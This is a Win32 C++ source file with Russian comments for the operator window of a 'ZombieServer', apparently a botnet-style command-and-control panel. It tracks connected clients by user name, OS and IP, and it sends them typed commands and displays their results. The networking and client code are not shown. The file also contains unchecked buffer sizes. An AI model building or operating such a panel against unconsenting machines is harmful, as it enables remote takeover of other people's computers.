#include "stdafx.h"
#include "Server.h"
#include "Packet.h"
#include "ZombieServer.h"

#define MAX_LOADSTRING 100

// Глобальные переменные:
HINSTANCE hInst;                                // Текущий экземпляр
TCHAR szTitle[MAX_LOADSTRING];                  // Текст строки заголовка
TCHAR szWindowClass[MAX_LOADSTRING];            // Имя класса главного окна

// Объявления функций, включенных в этот модуль кода:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
void				AddClient(User* user);
void				RemoveClient(char* id);

// Дескрипторы органов управления
HWND hTab;
HWND hListView;
HWND hEditView;
HWND hEditSend;
HWND hButton;
HWND hStatusBar;
HFONT hFont;

LV_COLUMN col;	// Колонка в таблице
LV_ITEM item;	// Строка в таблице
TCITEM tie;		// Закладка

char IDS[10] = "";					// Строковое ID
char cmdBuffer[500] = "";			//
char reportBuffer[100000] = "";		// Буфер для клиентского отчета о выполненной команде

// Работа с этим объектом возможна только из одного потока
// Методы этого класса ПОТОКО-НЕБЕЗОПАСНЫ!!!
// Для работы с объектом из разных пококов необходима синхронизация вызова методов
ZombieServer zombie;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// Инициализируем библиотеку сокетов
	WORD wsaVersion = MAKEWORD(2, 2);	// Версия библиотеки сокетов
	WSADATA wsaData;					// Хранит информацию об инициализации библиотеки сокетов									
	if (WSAStartup(wsaVersion, &wsaData) != NO_ERROR)
	{
		MessageBox(NULL, "Ошибка инициализации библиотеки сокетов!", "Ошибка", MB_OK);
		return FALSE;
	}

	// Инициализация List View
	INITCOMMONCONTROLSEX icex;
	icex.dwICC = ICC_LISTVIEW_CLASSES;
	InitCommonControlsEx(&icex);

	// Инициализация глобальных строк
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_SERVER, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// Выполнить инициализацию приложения:
	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SERVER));
	MSG msg;

	// Цикл основного сообщения:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int)msg.wParam;
}



//
//  ФУНКЦИЯ: MyRegisterClass()
//
//  НАЗНАЧЕНИЕ: регистрирует класс окна.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SERVER));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = CreateSolidBrush(RGB(240, 240, 240));
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   ФУНКЦИЯ: InitInstance(HINSTANCE, int)
//
//   НАЗНАЧЕНИЕ: сохраняет обработку экземпляра и создает главное окно.
//
//   КОММЕНТАРИИ:
//
//        В данной функции дескриптор экземпляра сохраняется в глобальной переменной, а также
//        создается и выводится на экран главное окно программы.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // Сохранить дескриптор экземпляра в глобальной переменной

	HWND hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
		CW_USEDEFAULT, 0, 605, 500, nullptr, nullptr, hInstance, nullptr);

	if (!hWnd)
	{
		return FALSE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

//
//  ФУНКЦИЯ: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  НАЗНАЧЕНИЕ:  обрабатывает сообщения в главном окне.
//
//  WM_COMMAND — обработать меню приложения
//  WM_PAINT — отрисовать главное окно
//  WM_DESTROY — отправить сообщение о выходе и вернуться
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	POINT pt;

	switch (message)
	{
	case WM_CREATE:

		// Закладки
		hTab = CreateWindow(WC_TABCONTROL, "", WS_VISIBLE | WS_CHILD | WS_CLIPSIBLINGS, 10, 10, 570, 420, hWnd, (HMENU)ID_TAB, hInst, NULL);
		tie.mask = TCIF_TEXT | TCIF_IMAGE;
		tie.pszText = (LPSTR)"Клиенты";
		TabCtrl_InsertItem(hTab, 0, &tie);
		tie.mask = TCIF_TEXT | TCIF_IMAGE;
		tie.pszText = (LPSTR)"Командная строка";
		TabCtrl_InsertItem(hTab, 1, &tie);

		// Клиенты
		hListView = CreateWindow(WC_LISTVIEW, "", WS_CHILD | LVS_REPORT | LVS_SHOWSELALWAYS | LVS_NOSORTHEADER | LVS_SINGLESEL, 30, 40, 530, 380, hWnd, NULL, hInst, NULL);
		ListView_SetExtendedListViewStyle(hListView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		col.mask = LVCF_TEXT | LVCF_WIDTH | LVIF_IMAGE;
		col.cx = 45;
		col.pszText = (LPSTR)"ID";
		ListView_InsertColumn(hListView, 0, &col);
		col.cx = 120;
		col.pszText = (LPSTR)"Имя пользователя";
		ListView_InsertColumn(hListView, 1, &col);
		col.cx = 150;
		col.pszText = (LPSTR)"Операционная система";
		ListView_InsertColumn(hListView, 2, &col);
		col.cx = 100;
		col.pszText = (LPSTR)"IP адрес";
		ListView_InsertColumn(hListView, 3, &col);
		col.cx = 100;
		col.pszText = (LPSTR)"Версия клиента";
		ListView_InsertColumn(hListView, 4, &col);

		// Создаем поле отчета
		hEditView = CreateWindow(WC_EDIT, "", WS_BORDER | WS_CHILD | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY, 20, 40, 550, 350, hWnd, (HMENU)ID_EDIT_VIEW, hInst, NULL);
		hFont = CreateFont(14, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
		SendMessage(hEditView, WM_SETFONT, (WPARAM)hFont, TRUE);

		// Создаем поле для набора отправлеой команды
		hEditSend = CreateWindow(WC_EDIT, "", WS_CHILD | WS_TABSTOP | WS_BORDER | ES_AUTOHSCROLL, 20, 395, 450, 25, hWnd, (HMENU)ID_EDIT_SEND, hInst, NULL);

		// Создаем кнопку отправки команды
		hButton = CreateWindow(WC_BUTTON, "Отправить", BS_PUSHBUTTON | WS_CHILD | WS_TABSTOP, 480, 395, 90, 25, hWnd, (HMENU)ID_BUTTON_SEND, hInst, NULL);

		// Отображаем
		ShowWindow(hListView, TRUE);
		ShowWindow(hTab, TRUE);

		// Запускаем сервер
		zombie.StartServer(hWnd);

		break;

	case WM_COMMAND:

		// Сообщения от командных органов управления
		wmId = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		switch (wmId)
		{
		case ID_BUTTON_SEND:

			// Сообщение от кнопки "Отправить"
			item.iItem = ListView_GetNextItem(hListView, -1, LVNI_SELECTED);
			if (item.iItem == -1)
			{
				// Ничего не вылелено
				break;
			}

			// Получаем информацию о выделенном элементе
			item.mask = LVIF_TEXT;
			item.iSubItem = 0;
			item.pszText = IDS;
			item.cchTextMax = 255;
			ListView_GetItem(hListView, &item);

			// Считываем введеную команду
			ZeroMemory(cmdBuffer, 500);
			GetWindowText(hEditSend, cmdBuffer, 500);
			SetWindowText(hEditSend, "");
			lstrcat(reportBuffer, cmdBuffer);
			SetWindowText(hEditView, reportBuffer);

			// Отправляем команду клиенту
			Packet pac;
			pac.type = PACKET_CMD;
			pac.id = atoi(IDS);
			memcpy(pac.data, cmdBuffer, sizeof(cmdBuffer));
			zombie.SendPacket(atoi(IDS), &pac);
			break;

		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;

	case WM_NOTIFY:

		// Сообщения от органов управления
		switch (wParam)
		{
		case ID_TAB:

			// Сообщения от вкладок
			switch (((LPNMHDR)lParam)->code)
			{
			case TCN_SELCHANGE:

				// Текущая закладка уходит с экрана
				int iPage = TabCtrl_GetCurSel(hTab);
				switch (iPage)
				{
				case 0:

					// Закладка "Клиенты"
					ShowWindow(hListView, TRUE);
					ShowWindow(hEditView, FALSE);
					ShowWindow(hEditSend, FALSE);
					ShowWindow(hButton, FALSE);
					break;

				case 1:

					// Закладка "Командная строка"
					ShowWindow(hListView, FALSE);
					ShowWindow(hEditView, TRUE);
					ShowWindow(hEditSend, TRUE);
					ShowWindow(hButton, TRUE);
					break;
				}
				break;
			}
			break;
		}
		break;



	case WM_JOINED_CLIENT:

		AddClient((User*)wParam);
		break;

	case WM_CLOSE_CLIENT:

		RemoveClient((char*)wParam);
		break;

	case WM_CMD_REPORT:

		// Выводим результат выполнения команды
		SetWindowText(hEditView, (char*)wParam);
		break;

	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		// TODO: Добавьте сюда любой код прорисовки, использующий HDC...
		EndPaint(hWnd, &ps);
	}
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}


void AddClient(User* user)
{
	// Добавляем клиента в таблицу
	item.mask = TVIF_TEXT | LVIF_IMAGE;
	item.iItem = 0;
	item.iImage = 0;
	item.iSubItem = 0;
	item.pszText = user->id;					// ID
	item.iItem = ListView_InsertItem(hListView, &item);

	item.iSubItem = 1;
	item.pszText = user->name;					// Имя пользователя
	ListView_SetItem(hListView, &item);

	item.iSubItem = 2;
	item.pszText = user->os;					// Версия Windows;
	ListView_SetItem(hListView, &item);

	item.iSubItem = 3;
	item.pszText = user->ip;					// IP адрес;
	ListView_SetItem(hListView, &item);

	item.iSubItem = 4;
	item.pszText = user->ver;					// Версия клиента;
	ListView_SetItem(hListView, &item);
}

void RemoveClient(char* id)
{
	char sID[10] = ""; // Сюда в цикле заполняется очередное ID из таблицы

	// Цикл по количеству строк в таблице
	for (int x = 0; x < ListView_GetItemCount(hListView); x++)
	{
		item.iItem = x;
		item.mask = LVIF_TEXT;
		item.iSubItem = 0;
		item.pszText = sID;
		item.cchTextMax = 12;
		ListView_GetItem(hListView, &item);
		if (!strcmp(sID, id))
		{
			// Если ID совпадает, удаляем строку
			ListView_DeleteItem(hListView, x);
			break;
		}
	}
}
